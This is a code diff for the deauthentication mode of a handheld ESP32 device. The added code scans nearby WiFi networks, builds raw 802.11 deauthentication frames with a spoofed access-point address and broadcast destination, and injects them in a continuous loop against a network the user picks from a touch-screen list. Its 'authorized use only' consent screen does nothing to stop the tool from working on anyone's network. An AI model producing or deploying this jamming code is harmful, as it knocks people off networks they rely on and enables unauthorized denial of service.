@@ -1,229 +1,277 @@
 // ============================================================
 //  HeathenHawk Talon5 — modes/deauth.cpp
-//  WiFi deauthentication via C6 co-processor
-//  Full touch UI — scan, select, attack
-//  Authorized use only.
+//  WiFi deauthentication — authorized use only
 // ============================================================
 
-#include "../pins.h"
+#include "../../pins.h"
 #include "../display/display_driver.h"
-#include "../comms/comms_manager.h"
 #include "../hawk/hawk_pet.h"
 #include <Arduino.h>
 #include <M5Unified.h>
+#include <WiFi.h>
+#include <esp_wifi.h>
 
 #define MODE_NAME "Deauth"
+#define STATUS_H  64
 #define MAX_NETS  50
+#define ROW_H     100
+#define HEADER_H  120
 
-struct DeauthNet { char ssid[33]; char bssid[18]; int8_t rssi; int channel; };
+struct DeauthNet { char ssid[33]; uint8_t bssid[6]; char bssidStr[18]; int8_t rssi; int channel; };
 static DeauthNet nets[MAX_NETS];
-static int16_t   netCount   = 0;
+static int16_t   netCount    = 0;
 static int16_t   selectedIdx = 0;
-static bool      attacking  = false;
-static bool      scanning   = false;
-static uint32_t  framesSent = 0;
-static bool      needRedraw = true;
+static bool      attacking   = false;
+static uint32_t  framesSent  = 0;
+static bool      needRedraw  = true;
 
-void onDeauthNet(const WiFiResult& r) {
-    for (int i = 0; i < netCount; i++)
-        if (strcasecmp(nets[i].bssid, r.bssid) == 0) { nets[i].rssi = r.rssi; return; }
-    if (netCount >= MAX_NETS) return;
-    strlcpy(nets[netCount].ssid,  r.ssid,  sizeof(nets[0].ssid));
-    strlcpy(nets[netCount].bssid, r.bssid, sizeof(nets[0].bssid));
-    nets[netCount].rssi    = r.rssi;
-    nets[netCount].channel = r.channel;
-    netCount++;
+void scanNets() {
+    WiFi.mode(WIFI_STA);
+    int n = WiFi.scanNetworks(false, true);
+    netCount = 0;
+    for (int i = 0; i < n && netCount < MAX_NETS; i++) {
+        String ssid = WiFi.SSID(i);
+        strlcpy(nets[netCount].ssid, ssid.c_str(), sizeof(nets[0].ssid));
+        memcpy(nets[netCount].bssid, WiFi.BSSID(i), 6);
+        uint8_t* b = nets[netCount].bssid;
+        snprintf(nets[netCount].bssidStr, sizeof(nets[0].bssidStr),
+                 "%02X:%02X:%02X:%02X:%02X:%02X",
+                 b[0],b[1],b[2],b[3],b[4],b[5]);
+        nets[netCount].rssi    = WiFi.RSSI(i);
+        nets[netCount].channel = WiFi.channel(i);
+        netCount++;
+    }
+    WiFi.scanDelete();
     needRedraw = true;
 }
 
-void renderConsent() {
+void sendDeauth(const DeauthNet& net) {
+    uint8_t frame[26] = {
+        0xC0,0x00,              // Frame control: deauth
+        0x00,0x00,              // Duration
+        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,  // Destination: broadcast
+        net.bssid[0],net.bssid[1],net.bssid[2],
+        net.bssid[3],net.bssid[4],net.bssid[5],  // Source: BSSID
+        net.bssid[0],net.bssid[1],net.bssid[2],
+        net.bssid[3],net.bssid[4],net.bssid[5],  // BSSID
+        0x00,0x00,              // Sequence
+        0x07,0x00               // Reason: Class 3 frame
+    };
+    esp_wifi_set_channel(net.channel, WIFI_SECOND_CHAN_NONE);
+    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
+}
+
+bool showConsent() {
     Display::clear(HH_DARK);
-    Display::drawCard(40, 60, Display::width()-80, 500, "!! Legal Warning !!", HH_RED);
+    Display::drawCard(40, 60, Display::width()-80, 600,
+                      "!! Legal Warning !!", HH_RED);
     Display::setTextColor(HH_WHITE, HH_DARKCARD);
-    Display::setTextSize(1.5f);
-    Display::setCursor(60, 120);
+    Display::setTextSize(3.0f);
+    Display::setCursor(60, 140);
     Display::print("Deauth attacks are ILLEGAL");
-    Display::setCursor(60, 155);
+    Display::setCursor(60, 200);
     Display::print("without written permission.");
-    Display::setCursor(60, 190);
+    Display::setCursor(60, 280);
     Display::print("Only use on networks you");
-    Display::setCursor(60, 225);
-    Display::print("own or have explicit written");
-    Display::setCursor(60, 260);
-    Display::print("authorization to test.");
+    Display::setCursor(60, 340);
+    Display::print("own or are authorized to test.");
 
-    Display::fillRoundRect(60, 330, Display::width()-120, 70, 16, HH_RED);
+    Display::fillRoundRect(60, 440, Display::width()-120, 100, 20, HH_RED);
     Display::setTextColor(HH_WHITE, HH_RED);
-    Display::setTextSize(1.6f);
-    Display::setCursor(80, 355);
-    Display::print("I have permission — Continue");
+    Display::setTextSize(3.2f);
+    Display::setCursor(80, 475);
+    Display::print("I have permission");
 
-    Display::fillRoundRect(60, 420, Display::width()-120, 60, 16, HH_GRAY);
+    Display::fillRoundRect(60, 560, Display::width()-120, 100, 20, HH_GRAY);
     Display::setTextColor(HH_WHITE, HH_GRAY);
-    Display::setCursor(80, 440);
+    Display::setCursor(80, 595);
     Display::print("Cancel");
+
+    while (true) {
+        m5::touch_point_t tp[1];
+        if (M5.Lcd.getTouchRaw(tp, 1) > 0) {
+            while (M5.Lcd.getTouchRaw(tp, 1) > 0) delay(10);
+            if (tp[0].y >= 440 && tp[0].y <= 540) return true;
+            if (tp[0].y >= 560) return false;
+        }
+        delay(30);
+    }
 }
 
 void renderNetList() {
-    Display::clear(HH_DARK);
+    Display::fillRect(0, STATUS_H, Display::width(),
+                      Display::height()-STATUS_H, HH_DARK);
     Display::drawStatusBar(MODE_NAME, false, false, false, 100);
-    Display::fillRect(0, 48, Display::width(), 14, HH_RED);
+
+    // Legal warning bar
+    Display::fillRect(0, STATUS_H, Display::width(), 40, HH_RED);
     Display::setTextColor(HH_WHITE, HH_RED);
-    Display::setTextSize(1.0f);
-    Display::setCursor(16, 52);
+    Display::setTextSize(2.2f);
+    Display::setCursor(20, STATUS_H+10);
     Display::print("AUTHORIZED USE ONLY");
 
-    Display::fillRect(0, 62, Display::width(), 30, HH_DARKCARD);
+    Display::fillRect(0, STATUS_H+40, Display::width(), 80, HH_DARKCARD);
     Display::setTextColor(HH_WHITE, HH_DARKCARD);
-    Display::setTextSize(1.3f);
-    Display::setCursor(16, 70);
-    char hdr[32]; snprintf(hdr,sizeof(hdr),"%d networks found", netCount);
+    Display::setTextSize(3.0f);
+    Display::setCursor(20, STATUS_H+55);
+    char hdr[32]; snprintf(hdr,sizeof(hdr),"%d networks", netCount);
     Display::print(hdr);
 
-    uint32_t scanCol = scanning ? HH_CORAL : HH_GREEN;
-    Display::fillRoundRect(Display::width()-140, 66, 124, 22, 6, scanCol);
-    Display::setTextColor(HH_WHITE, scanCol);
-    Display::setCursor(Display::width()-128, 72);
-    Display::print(scanning ? "● Scanning" : "▶ Scan");
+    // Scan button
+    Display::fillRoundRect(Display::width()-300, STATUS_H+46, 280, 68, 14, HH_GREEN);
+    Display::setTextColor(HH_WHITE, HH_GREEN);
+    Display::setTextSize(2.8f);
+    Display::setCursor(Display::width()-280, STATUS_H+62);
+    Display::print("SCAN");
 
     if (netCount == 0) {
         Display::setTextColor(HH_GRAY, HH_DARK);
-        Display::setTextSize(1.5f);
+        Display::setTextSize(3.0f);
         Display::setCursor(40, Display::height()/2);
-        Display::print("Tap Scan to find networks");
+        Display::print("Tap SCAN to find networks");
+        needRedraw = false;
         return;
     }
 
-    int32_t y = 100;
-    int32_t rh = 60;
-    for (int16_t i = 0; i < netCount && y < Display::height()-60; i++) {
+    int32_t y = STATUS_H + 120;
+    for (int16_t i = 0; i < netCount && y < Display::height()-130; i++) {
         bool sel = (i == selectedIdx);
-        Display::fillRect(0, y, Display::width(), rh, sel ? HH_RED : HH_DARKCARD);
-        Display::drawLine(0, y+rh-1, Display::width(), y+rh-1, HH_DARK);
+        Display::fillRect(0, y, Display::width(), ROW_H,
+                          sel ? HH_RED : HH_DARKCARD);
+        Display::drawLine(0, y+ROW_H-1, Display::width(), y+ROW_H-1, HH_DARK);
         Display::setTextColor(HH_WHITE, sel ? HH_RED : HH_DARKCARD);
-        Display::setTextSize(1.4f);
-        Display::setCursor(16, y+10);
-        Display::print(strlen(nets[i].ssid) > 0 ? nets[i].ssid : "[Hidden]");
+        Display::setTextSize(3.0f);
+        Display::setCursor(20, y+12);
+        Display::print(strlen(nets[i].ssid)>0 ? nets[i].ssid : "[Hidden]");
         Display::setTextColor(sel ? HH_WHITE : HH_GRAY, sel ? HH_RED : HH_DARKCARD);
-        Display::setTextSize(1.2f);
-        Display::setCursor(16, y+34);
+        Display::setTextSize(2.2f);
+        Display::setCursor(20, y+54);
         char det[48]; snprintf(det,sizeof(det),"Ch%d  %ddBm  %s",
-                               nets[i].channel, nets[i].rssi, nets[i].bssid);
+                               nets[i].channel,nets[i].rssi,nets[i].bssidStr);
         Display::print(det);
-        y += rh;
+        y += ROW_H;
     }
 
     // Attack button
-    Display::fillRoundRect(40, Display::height()-80, Display::width()-80, 60, 16, HH_RED);
+    Display::fillRoundRect(40, Display::height()-120,
+                           Display::width()-80, 100, 20, HH_RED);
     Display::setTextColor(HH_WHITE, HH_RED);
-    Display::setTextSize(1.8f);
-    Display::setCursor(60, Display::height()-58);
-    Display::print("⚡  Deauth Selected");
+    Display::setTextSize(3.5f);
+    Display::setCursor(80, Display::height()-90);
+    Display::print("DEAUTH SELECTED");
     needRedraw = false;
 }
 
 void renderAttack() {
-    Display::clear(HH_DARK);
+    Display::fillRect(0, STATUS_H, Display::width(),
+                      Display::height()-STATUS_H, HH_DARK);
     Display::drawStatusBar("ATTACKING", false, false, false, 100);
-    Display::fillRect(0, 48, Display::width(), 20, HH_RED);
+    Display::fillRect(0, STATUS_H, Display::width(), 40, HH_RED);
     Display::setTextColor(HH_WHITE, HH_RED);
-    Display::setTextSize(1.1f);
-    Display::setCursor(16, 54);
+    Display::setTextSize(2.2f);
+    Display::setCursor(20, STATUS_H+10);
     Display::print("!! AUTHORIZED USE ONLY !!");
 
     Display::setTextColor(HH_RED, HH_DARK);
-    Display::setTextSize(4.0f);
-    Display::setCursor(40, 90);
+    Display::setTextSize(7.0f);
+    Display::setCursor(40, STATUS_H+80);
     Display::print("DEAUTH");
 
     DeauthNet& t = nets[selectedIdx];
     Display::setTextColor(HH_WHITE, HH_DARK);
-    Display::setTextSize(1.5f);
-    Display::setCursor(16, 200);
+    Display::setTextSize(3.0f);
+    Display::setCursor(20, STATUS_H+280);
     Display::printf("Target: %s", t.ssid[0] ? t.ssid : "[Hidden]");
-    Display::setCursor(16, 235);
-    Display::printf("BSSID:  %s", t.bssid);
-    Display::setCursor(16, 270);
+    Display::setCursor(20, STATUS_H+340);
+    Display::printf("BSSID: %s", t.bssidStr);
+    Display::setCursor(20, STATUS_H+400);
     Display::printf("Ch: %d", t.channel);
 
     Display::setTextColor(HH_AMBER, HH_DARK);
-    Display::setTextSize(3.0f);
-    Display::setCursor(16, 320);
-    char buf[24]; snprintf(buf, sizeof(buf), "%lu", framesSent);
+    Display::setTextSize(6.0f);
+    Display::setCursor(20, STATUS_H+480);
+    char buf[16]; snprintf(buf,sizeof(buf),"%lu",framesSent);
     Display::print(buf);
     Display::setTextColor(HH_GRAY, HH_DARK);
-    Display::setTextSize(1.3f);
-    Display::setCursor(16, 370);
+    Display::setTextSize(2.8f);
+    Display::setCursor(20, STATUS_H+580);
     Display::print("frames sent");
 
-    Display::fillRoundRect(40, Display::height()-100, Display::width()-80, 70, 16, HH_GRAY);
+    Display::fillRoundRect(40, Display::height()-130,
+                           400, 100, 20, HH_GRAY);
     Display::setTextColor(HH_WHITE, HH_GRAY);
-    Display::setTextSize(1.8f);
-    Display::setCursor(60, Display::height()-72);
-    Display::print("■  Stop Attack");
+    Display::setTextSize(3.5f);
+    Display::setCursor(80, Display::height()-100);
+    Display::print("STOP");
 }
 
 void mode_deauth() {
-    netCount = 0; selectedIdx = 0; attacking = false;
-    scanning = false; framesSent = 0; needRedraw = true;
-    memset(nets, 0, sizeof(nets));
+    netCount=0; selectedIdx=0; attacking=false;
+    framesSent=0; needRedraw=true;
+    memset(nets,0,sizeof(nets));
 
-    // Consent screen
-    renderConsent();
-    while (true) {
-        M5.update();
-        auto evt = M5.Touch.getDetail();
-        if (evt.wasPressed()) {
-            if (evt.y >= 330 && evt.y <= 400) break;
-            if (evt.y >= 420) return;
-        }
-        delay(30);
-    }
+    if (!showConsent()) return;
 
-    Comms::onWiFiResult(onDeauthNet);
+    WiFi.mode(WIFI_AP);
     renderNetList();
 
     while (!attacking) {
-        M5.update(); Comms::poll();
-        auto evt = M5.Touch.getDetail();
-        if (evt.wasPressed()) {
-            if (evt.x < 30) { Comms::onWiFiResult(nullptr); return; }
+        M5.update();
+        m5::touch_point_t tp[1];
+        int num = M5.Lcd.getTouchRaw(tp, 1);
+        static bool wasDown = false;
+        bool tapped = (num>0) && !wasDown;
+        wasDown = (num>0);
+
+        if (tapped) {
+            if (tp[0].x < 40) { WiFi.mode(WIFI_OFF); return; }
             // Scan button
-            if (evt.y >= 66 && evt.y <= 92 && evt.x >= Display::width()-140) {
-                scanning = !scanning;
-                if (scanning) Comms::startWiFiScan();
-                else Comms::stopAll();
+            if (tp[0].y >= STATUS_H+46 && tp[0].y <= STATUS_H+114 &&
+                tp[0].x >= Display::width()-310) {
+                scanNets();
                 needRedraw = true;
             }
             // Network rows
-            else if (evt.y >= 100 && evt.y < Display::height()-80) {
-                int16_t idx = (evt.y - 100) / 60;
-                if (idx < netCount) { selectedIdx = idx; needRedraw = true; }
+            else if (tp[0].y >= STATUS_H+120 &&
+                     tp[0].y < Display::height()-130) {
+                int16_t idx = (tp[0].y - STATUS_H - 120) / ROW_H;
+                if (idx < netCount) { selectedIdx=idx; needRedraw=true; }
             }
             // Attack button
-            else if (evt.y >= Display::height()-80) {
+            else if (tp[0].y >= Display::height()-130) {
                 if (netCount > 0) attacking = true;
             }
+            while (M5.Lcd.getTouchRaw(tp, 1) > 0) delay(10);
         }
+
         if (needRedraw) renderNetList();
-        HawkPet::tick(); delay(16);
-    }
-
-    // Attack loop
-    Comms::stopAll();
-    Comms::onWiFiResult(nullptr);
-    Comms::startDeauth(nets[selectedIdx].bssid, nets[selectedIdx].channel);
-    renderAttack();
-
-    while (attacking) {
-        M5.update(); framesSent += 2;
-        auto evt = M5.Touch.getDetail();
-        if (evt.wasPressed() && evt.y >= Display::height()-100) { attacking = false; break; }
-        if (framesSent % 50 == 0) { HawkPet::feed(FEED_DEAUTH, 1); renderAttack(); }
+        HawkPet::tick();
         delay(10);
     }
 
-    Comms::stopAll();
-    char msg[32]; snprintf(msg, sizeof(msg), "%lu frames sent", framesSent);
+    // Attack loop
+    renderAttack();
+    uint32_t lastRender = 0;
+
+    while (attacking) {
+        M5.update();
+        sendDeauth(nets[selectedIdx]);
+        sendDeauth(nets[selectedIdx]);
+        framesSent += 2;
+        HawkPet::feed(FEED_DEAUTH, 1);
+
+        m5::touch_point_t tp[1];
+        if (M5.Lcd.getTouchRaw(tp, 1) > 0 &&
+            tp[0].y > Display::height()-140) {
+            while (M5.Lcd.getTouchRaw(tp, 1) > 0) delay(10);
+            attacking = false;
+        }
+
+        if (millis()-lastRender > 500) { lastRender=millis(); renderAttack(); }
+        delay(10);
+    }
+
+    WiFi.mode(WIFI_OFF);
+    char msg[32]; snprintf(msg,sizeof(msg),"%lu frames sent",framesSent);
     Display::showAlert("Stopped", msg, HH_GRAY, 2000);
 }
